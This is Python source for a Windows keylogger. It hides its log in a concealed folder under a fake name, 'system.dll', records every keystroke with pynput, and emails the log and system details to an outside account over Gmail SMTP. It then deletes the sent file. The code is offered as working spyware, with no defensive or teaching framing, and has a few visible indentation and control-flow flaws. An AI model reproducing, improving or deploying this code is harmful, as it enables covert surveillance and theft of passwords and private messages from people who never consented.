import os , win32api , win32con
import shutil
import logging
from pynput.keyboard import Key, Listener
import socket
from time import gmtime, strftime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform , smtplib

class File :

    directory = "C://ProgramData//system32//"
    log_dir = directory + "system.dll"
    def __init__(self):
        if not os.path.exists(self.directory):
            os.makedirs(self.directory)
            #make the path hidden
            win32api.SetFileAttributes(self.directory,win32con.FILE_ATTRIBUTE_HIDDEN)
        self.makeFile()

    def makeFile(self):
        if os.path.exists(self.log_dir):
            src= self.directory
            old_file_name="system.dll"
            source = os.path.join(src, old_file_name)
            shutil.copy(source, os.path.join(src, "system.dll.txt"))
            win32api.SetFileAttributes(self.directory+"system.dll.txt",win32con.FILE_ATTRIBUTE_HIDDEN)
            os.remove(source)

      


class Logg:
    
    directory = "C://ProgramData//system32//"
    log_dir = directory + "system.dll"
    
    def __init__(self):
        logging.basicConfig(filename=self.log_dir,level=logging.DEBUG,format='%(asctime)s: %(message)s')
        #make the file hidden
        win32api.SetFileAttributes(self.log_dir,win32con.FILE_ATTRIBUTE_HIDDEN)
        with Listener (on_press=self.on_press) as listener :
            listener.join()

    def on_press(self,key):
        logging.info(str(key))


class Internet:

    REMOTE_SERVER = "www.google.com"
    directory = "C://ProgramData//system32//"
    def check_the_connection(self):
        try:
            host = socket.gethostbyname(self.REMOTE_SERVER)
            s = socket.create_connection((host, 80), 2)
            return True
        except:
             pass
        return False
        

    def send_mail(self):
	email_user = ''
        email_password = ''
        email_send = ''
    
        subject = "keylogger" + strftime("%Y-%m-%d %H:%M:%S", gmtime()) 

        msg = MIMEMultipart()
        msg['From'] = email_user
        msg['To'] = email_send
        msg['Subject'] = subject

        body = platform.uname()
        msg.attach(MIMEText(str(body),'plain'))

        sendfile= self.directory+'system.dll.txt'
    
        if  os.path.exists(sendfile):
        
            attachment  =open(sendfile,'rb')

            part = MIMEBase('application','octet-stream')
            part.set_payload((attachment).read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition',"attachment; filename= "+sendfile)

            msg.attach(part)
            text = msg.as_string()
            server = smtplib.SMTP('smtp.gmail.com',587)
            server.starttls()
            server.login(email_user,email_password)

        
            
            server.sendmail(email_user,email_send,text)
            server.quit()

            return True
        else:
            
            return False
        
    



make=File()


net = Internet()
connection_counter = 0 
while True :
    connection=net.check_the_connection()
    if connection == True :
        
        connection_counter += 1
        if (connection_counter == 10 ):
            #start sending the mail
            result=net.send_mail()
            if result == True :
                os.remove("C://ProgramData//system32//system.dll.txt")  
            break
    else :
        connection_counter = 0
       

m=Logg()















